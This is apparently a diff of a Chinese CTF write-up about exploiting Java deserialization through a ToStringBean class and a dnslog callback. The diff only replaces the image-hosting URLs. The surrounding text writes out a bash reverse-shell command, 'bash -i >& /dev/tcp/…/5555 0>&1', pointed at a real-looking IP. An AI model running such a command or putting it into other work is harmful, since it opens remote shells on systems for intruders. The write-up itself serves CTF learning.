@@ -37,15 +37,15 @@ file.close()
 
 在`/common/user/current`发送
 
-![image-20220326161131867](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161131867.png)
+![image-20220326161131867](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220326161131867.png)
 
 dnslog收到请求
 
-![image-20220326161147299](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161147299.png)
+![image-20220326161147299](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220326161147299.png)
 
 `bash -i >& /dev/tcp/121.40.113.226/5555 0>&1`反弹shell的命令要进行一次转换
 
-![image-20220326162201101](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326162201101.png)
+![image-20220326162201101](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220326162201101.png)
 
 
 
@@ -61,11 +61,11 @@ dnslog收到请求
 
 题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可
 
-![image-20220318151601653](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151601653.png)
+![image-20220318151601653](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220318151601653.png)
 
 并且在IndexController这个Controller类中发现了能进行反序列化的地方
 
-![image-20220318151834640](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151834640.png)
+![image-20220318151834640](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220318151834640.png)
 
 java中ObjectInputStream.readObject其实就是反序列化的方法
 
